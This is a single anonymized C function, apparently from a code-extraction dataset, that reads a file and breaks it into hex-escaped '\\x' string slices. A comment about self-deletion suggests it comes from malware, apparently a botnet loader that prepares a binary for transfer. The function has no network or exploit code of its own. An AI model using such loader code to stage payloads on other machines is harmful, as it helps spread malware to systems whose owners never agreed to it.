#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int num_slices; int /*<<< orphan*/ ** slices; } ;

/* Variables and functions */
 int BYTES_PER_LINE ; 
 int MAX_SLICE_LENGTH ; 
 int /*<<< orphan*/  O_RDONLY ; 
 TYPE_1__ binary ; 
 void* FUNC0 (int,int) ; 
 int FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (char*,int /*<<< orphan*/ ) ; 
 int FUNC4 (int,unsigned char*,int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ *,char*,unsigned char) ; 
 int FUNC6 (int /*<<< orphan*/ *) ; 

int FUNC7(char *path)
{
    // /proc/self/exe still works even when we delete ourselves l0l
    int fd, size = 0, got = 0, i, slice = 0;
    unsigned char ch;
    
    if ((fd = FUNC3(path, O_RDONLY)) == -1)
        return -1;
    while ((got = FUNC4(fd, &ch, 1)) > 0) size++;
    FUNC2(fd);
    
    binary.num_slices = FUNC1(size / (float)BYTES_PER_LINE);
    binary.slices = FUNC0(binary.num_slices, sizeof(unsigned char *));
    if (binary.slices == NULL)
        return -1;
        
    for (i = 0; i < binary.num_slices; i++)
    {
        binary.slices[i] = FUNC0(1, MAX_SLICE_LENGTH + 1);
        if (binary.slices[i] == NULL)
            return -1;
    }
    
    if ((fd = FUNC3(path, O_RDONLY)) == -1)
        return -1;
    do
    {
        for (i = 0; i < BYTES_PER_LINE; i++)
        {
            got = FUNC4(fd, &ch, 1);
            if (got != 1) break;
            
            FUNC5(binary.slices[slice] + FUNC6(binary.slices[slice]), "\\\\x%02X", ch);
        }
        
        slice++;
    } while(got > 0);
    FUNC2(fd);
    
    return 0;
}